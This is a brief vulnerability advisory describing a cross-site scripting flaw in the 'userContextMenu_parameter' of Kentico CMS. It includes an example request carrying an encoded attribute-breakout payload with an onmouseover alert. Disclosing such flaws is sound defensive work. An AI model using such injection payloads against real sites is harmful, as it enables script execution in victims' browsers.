Kentico CMS 'userContextMenu_parameter' Parameter Cross Site Scripting Vulnerability

To exploit this issue, an attacker must entice an unsuspecting user to follow a malicious URI.

The following example URI is available:

POST http://localhost/examples/webparts/membership/users-viewer.aspx HTTP/1.1
&amp;userContextMenu_parameter=%22%20onmouseover%3Dalert%281%29%20zsl%3D%22
